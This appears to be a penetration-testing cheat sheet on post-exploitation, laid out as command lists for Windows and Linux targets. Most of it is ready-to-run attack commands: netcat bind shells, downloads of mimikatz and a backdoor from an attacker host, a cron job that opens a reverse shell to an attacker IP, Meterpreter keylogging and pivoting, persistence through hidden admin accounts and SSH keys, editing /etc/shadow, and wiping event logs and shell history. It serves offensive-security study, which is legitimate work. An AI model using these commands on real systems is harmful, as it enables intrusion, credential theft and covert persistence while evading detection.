# 3 - Post-Exploitation

## <mark style="color:green;">General</mark>

### Bind Shell

This type of shell is not preferred as the attacker directly connects to the target system and in most cases, ingress traffic is always blocked or flagged as suspicious.

* Windows (target)
  * `nc -nvlp <PORT> -e cmd.exe` or `nc.exe -nvlp <PORT> -e cmd.exe`
* Linux (target)
  * `nc -nvlp <PORT> -e /bin/bash`
* Linux (attacker)
  * `nc -nv <IP> <PORT>`
* Windows (attacker
  * `nc.exe -nv <IP> <PORT>`

### Transfer files

* Windows
  * `certutil -urlcache -f http://<host>/mimikatz.exe mimikatz.exe`
* Linux
  * `wget http://<host>/backdoor.php`
* Netcat
  * `nc -nvlp 1234 > test.txt (recepient)`
  * `nc -nv <ip> <port> < test.txt (sender)`

### Interactive shell

* Linux
  * `/bin/bash -i`

### Fully interactive shell

* Python
  1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` or `python -c 'import pty;pty.spawn("/bin/bash")'`
  2. Press `CTRL + Z` : to background process and get back to your host machine
  3. `stty raw -echo; fg`
  4. `export TERM=xterm`

### Keylogger

* Metasploit
  * `keyscan_start` : start keylogger
  * `keyscan_dump` : print captured strokes

### Pivoting

* Metasploit (in meterpreter)
  * `ipconfig` : find subnet (the host may be in other network)
  * `run autoroute -s <subnet>` : **This means anytime we want to contact a machine within one of the networks specified, we will go through meterpreter session and use that to connect to the targets.**
    * Example:
      * `ipconfig` : IP 19.9.29.148. Netmask: 255.255.240.0
      * `run autoroute -s 10.10.0.29.0/20`
  * `run autoroute -p` : Displays active routing table.
  * auxiliary/scanner/portscan/tcp : We can perform the scan. NOTE: scanning with metasploite is limited (we can't discover software version etc...) so it's better to use nmap. To do that we need to perform port forwarding.
  * **since target\_sys\_2 does not have a route back to attacker\_sys, use bind\_shell payload** : windows/meterpreter/bind\_tcp
* Port forwarding (meterpreter/metasploit)
  * `portfwd add -l 1234 -p 80 -r <target_sys_2_ip>` : Forward remote port to local port. In this case we want to scan the port 80 of the target 2
  * `portfwd list`
  * `nmap -sV -sC -p 1234 localhost`

### Change user password

* Linux
  * `openssl passwd -1 -salt <salt> <new_pass>`
    * \-1 means weakest algorithm, -6 means strongest
    * Copy the generate entry and add it to root record in /etc/shadow
* Windows
  * `net user <username> <new_pass>`

## <mark style="color:green;">Windows</mark>

### Enumeration

* System info
  * `systeminfo`
  * `whoami` : Get current user
  * `whoami /priv` : Get current user privileges. Useful for privelage escalation
  * `wmic qfe get Caption,HotFixID,InstalledOn,Description` : Get installed updates. Useful to see security patch
  * `net localgroup` : Adds, displays, or modifies local groups
  * `net localgroup <group>` : Get group membership of user -> `net localgroup administrators`
  * `net user <user>` : Get user info
* Network Info
  * `ipconfig /all`
  * `netstat -ano` : lists info on tcp/udp ports
  * `netsh advfirewall show allprofiles` : shows f/w status
  * `arp -a` : display arp table (arp cache to discover other IP addresses on the target network)
  * `route print` : print route table (useful during the pivoting phase of post-exploitation as it can reveal network routes)
* Processes & Services
  * `net start` : lists services running
  * `wmic service list brief` : same as above with extra details like pid, active state, etc.
  * `net stop <servicename>` : stop a service
  * `tasklist /svc` : list process with respecive services
  * `schtasks /query /fo list /v` : list scheduled tasks
* Automation : JAWS - https://github.com/411Hall/JAWS
  * `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`

### Persistence

* Metasploit
  * search persistence module (Windows)
  * Ex: exploit/windows/local/persistence\_service
    * It will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
    * When you want to connect again you need to set a listener to receive the connection
* Enable RDP
  * with metasploit : search enable\_rdp (and set session)
    * Connect to victim from attacker
      * Note: you need username and password, if you don't have the password : change it `net user <username> <new_pass>` (suspicious in a real environment) or crack NTLM...
      * Note 2: you can create a new account and add it to administrator group...
  * second way with metasploit/meterpreter (auto create account and settings):
    * In meterpreter `run getgui -e -u user_you_want -p password_you_want`
      * enables rdp service --> creates new user with the provided parameters --> hides user from windows login screen --> adds user to Remote Desktop Users and Administrators group.

### Clearing tracks

* Metasploit/Meterpreter
  * `clearev` (clear the Application, System, and Security logs on a Windows system)

## <mark style="color:green;">Linux</mark>

### Enumeration

* System info
  * `cat /etc/issue` Print linux distro version (Contains a message or system identification to be printed before the login prompt)
  * `uname -a` Print certain system information. One example : Useful for kernel privesc or to show architecture
  * `env` Print environment variables
  * `lscpu` : for hardware info
  * `free -h` : for RAM usage
  * `df -h` : for disk usage
  * `dpkg -l` : list packages installed with version
* Enumerate Users
  * `whoami`
  * `groups <user>`
  * `useradd -m <user> -s /bin/bash` : Creates a user. Useful for persistence
  * `usermod -aG root <user>` : Add bob to root group. Useful for persistence
  * `lastlog` : ssh session enumerate
  * `last` : log of users logged in
* Enumerate Network
  * We want: Current IP, Internal networks, TCP/UDP services running and their respective ports, Other hosts on the network
  * `ip a`
    * Useful to discover other network
  * `cat /etc/hostname` : display hostname
  * `cat /etc/hosts` : maps IP addresses to domain
    * Useful to discover internal domain you can access
  * `cat /etc/resolv.conf` : display the domain name server
    * Many times it is the default gateway
  * Meterpreter
    * `netstat` : Display the network connections
    * `route` : View and modify the routing table
      * Note: gateway is important... it can be a DNS server, DHCP server or all in one
    * `arp -a` : Display the host ARP cache
* Processes & services
  * `ps aux | grep root` : Useful for privesc
  * `top` dynamic real-time view of a running system (like task manager)
  * `crontab -l` : display cronjob for the root user
  * `ls -al /etc/cron*` : display all file that contains cronjob
  * `cat /etc/cron*` : display the contents of all cronjob files

### Persistence

* Metasploit
  * search persistence module (Linux)
    * Example: post/linux/manage/sshkey\_persistence (needed elevated privs - This module will add an SSH key to a specified user)
* Via SSH key
  * After gaining access to linux system, you can transfer SSH private key to local machine and use it to connect via SSH
* With cron jobs
  * Set up listener
  * `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > cron` : create a cronjob (every minute time format)
  * `crontab -i cron`
  * `crontab -l` : crontab for the current user
  * NOTE: if the command doesn't work try with another one... revshell

### Clearing tracks

* `history -c` : to clear history in linux
* `cat /dev/null > ~/.bash_history` : same as above
